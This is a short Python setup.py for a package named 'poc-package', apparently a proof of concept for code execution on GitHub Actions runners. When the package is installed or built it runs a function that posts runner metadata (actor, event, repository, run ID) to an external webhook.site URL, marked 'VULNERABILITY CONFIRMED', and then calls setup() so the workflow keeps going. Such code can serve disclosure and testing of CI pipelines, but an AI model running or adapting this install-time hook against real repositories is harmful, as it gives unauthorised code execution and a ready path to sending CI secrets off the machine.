import os
import sys
import json
import urllib.request
from setuptools import setup

# Webhook URL for verification
WEBHOOK_URL = "https://webhook.site/b685eb66-1254-43b1-a81d-59d80e8591a3"

def send_confirmation():
    # Data to send to the webhook
    data = {
        "status": "VULNERABILITY CONFIRMED",
        "message": "setup.py executed successfully on GitHub Runner",
        "actor": os.environ.get("GITHUB_ACTOR"),
        "event": os.environ.get("GITHUB_EVENT_NAME"),
        "repository": os.environ.get("GITHUB_REPOSITORY"),
        "run_id": os.environ.get("GITHUB_RUN_ID")
    }
    
    try:
        req = urllib.request.Request(
            WEBHOOK_URL, 
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json'}
        )
        with urllib.request.urlopen(req) as response:
            pass # Request successful
    except Exception as e:
        # Fallback to stderr if network fails so we still see something in logs
        sys.stderr.write(f"Webhook failed: {str(e)}\n")

# Execute the webhook send
send_confirmation()

# Maintain valid setup structure so the workflow continues
setup(
    name="poc-package",
    version="0.0.1",
)

